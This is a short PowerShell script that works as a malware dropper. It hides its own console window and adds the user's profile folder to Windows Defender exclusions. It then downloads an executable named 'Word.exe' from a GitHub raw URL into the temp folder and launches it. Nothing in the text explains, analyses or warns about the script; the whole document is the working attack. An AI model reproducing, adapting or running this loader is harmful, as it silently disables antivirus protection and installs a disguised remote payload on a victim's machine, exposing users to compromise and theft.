Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
Add-MpPreference -ExclusionPath $env:USERPROFILE
$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
Start-Sleep -Milliseconds 100 
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile

